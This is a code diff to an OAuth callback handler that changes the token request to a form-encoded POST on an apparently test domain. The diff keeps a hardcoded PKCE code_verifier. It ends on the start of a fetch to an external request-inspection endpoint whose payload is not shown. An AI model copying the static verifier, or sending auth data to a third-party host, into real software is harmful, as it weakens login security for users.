@@ -6,12 +6,16 @@
     const state = params.get("state");
     const error = params.get("error");
 
-    const url = new URL("https://login.sketchycompany.upd-dcs.work/token")
-    url.searchParams.set("code", code);
-    url.searchParams.set("code_verifier", "OmgZPWrKe8dSkHQyEriI0n1H0WuL6P2BttYqGMTE10iDKeJI_WrzZCrSj8qSaYqL");
-
-    const response = await fetch(url, {
+    const response = await fetch("https://login.sketchycompany.upd-dcs.work/token", {
         method: 'POST',
+        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+        body: new URLSearchParams({
+            grant_type: 'authorization_code',
+            code: code,
+            redirect_uri: 'https://github-04463.sketchycompany.upd-dcs.work/callback',
+            client_id: 'CLIENT123',
+            code_verifier: 'OmgZPWrKe8dSkHQyEriI0n1H0WuL6P2BttYqGMTE10iDKeJI_WrzZCrSj8qSaYqL',
+        })
     })
 
     fetch("https://inspect.hookdeck.com/e/4cwav1z3r8d72r", {
